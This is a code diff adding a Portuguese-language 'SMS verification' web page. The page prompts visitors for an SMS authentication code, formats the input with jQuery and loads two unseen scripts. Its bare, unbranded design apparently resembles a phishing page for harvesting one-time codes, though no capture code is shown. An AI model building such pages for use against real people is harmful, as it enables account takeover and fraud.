@@ -1,0 +1,97 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/fride-select.css">
+    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    
+    
+        <div>
+            <div class="upto">
+                <div class="upto">
+                    <img src="./img/hedopat2.png" alt="">
+                </div>
+            </div>
+        
+        
+            <div class="container">
+                <div class="container">
+          
+                    <div class="upon">
+                        <p class="pp1">Verificação de SMS</p>
+                        <p class="pp3"><span>*</span> Um código SMS será enviado para o seu número, com o código de autenticação. Aguarde o SMS e, assim que o receber, insira o código abaixo.</p>
+                    </div>
+            
+                    <form method="post" id="pg4">
+                      
+                        <div class="group">  
+                                
+                            <input type="tele" id="codima" required placeholder="" maxlength="14">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label for="">Código SMS</label>
+                        </div>
+                            
+                        
+                        
+        
+                        <button id="botn" disabled>Entrar <svg width="80" height="86" viewBox="0 0 50 46" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path class="fill" fill-rule="evenodd" clip-rule="evenodd" d="M27.7823 4.91936L27.9737 4.69562C28.8028 3.83947 30.1074 3.77361 31.0097 4.49805L31.2263 4.69562L47.3263 21.3206L47.4216 21.425V21.425L47.5484 21.5861V21.5861L47.7133 21.8504V21.8504L47.8362 22.1181V22.1181L47.9176 22.3683V22.3683L47.9841 22.7195V22.7195L48 23V23L47.9936 23.1787V23.1787L47.9534 23.4767V23.4767L47.8856 23.7413V23.7413L47.7845 24.0052V24.0052L47.6642 24.2367V24.2367L47.4947 24.4854V24.4854L47.3263 24.6794L31.2263 41.3044C30.3281 42.2319 28.8719 42.2319 27.9737 41.3044C27.1445 40.4482 27.0808 39.1011 27.7823 38.1694L27.9737 37.9456L40.1432 25.375H4.3C3.02974 25.375 2 24.3117 2 23C2 21.6883 3.02974 20.625 4.3 20.625H40.1478L27.9737 8.05438C27.1445 7.19823 27.0808 5.85106 27.7823 4.91936L27.9737 4.69562L27.7823 4.91936Z" fill="white"/>
+                            </svg></button>
+                        
+                    </form>
+                        
+                    
+                   
+                    
+                  </div> 
+            </div>
+        </div>
+        </div>
+
+    
+
+        <script>
+            $(document).ready(function() {
+                $('#codima').on('input', function() {
+                    // Remove any existing dots, dashes, and non-digit characters
+                    var inputValue = $(this).val().replace(/[^\d]/g, '');
+                    
+                    // Format the input
+                    var formattedValue = '';
+                    for (var i = 0; i < inputValue.length; i++) {
+                        if (i > 0 && i % 3 === 0 && i < 9) {
+                            formattedValue += ' - ';
+                        } else if (i >= 9 && (i - 9) % 2 === 0) {
+                            formattedValue += '-';
+                        }
+                        formattedValue += inputValue[i];
+                    }
+                    
+                    $(this).val(formattedValue);
+                    
+                    // Enable the button if the input has 10 or more digits, otherwise, disable it
+                    if (inputValue.length >= 6) {
+                        $('#botn').prop('disabled', false);
+                    } else {
+                        $('#botn').prop('disabled', true);
+                    }
+                });
+                
+                // Button click event (you can modify this event as needed)
+                $('#botn').on('click', function() {
+                    alert('Formatting the number...');
+                });
+            });
+        </script>
+    <script src="./js/stb.js"></script>
+    <script src="./js/inp.js"></script>
+    <script>
+        
+    </script>
+</body>
+</html>
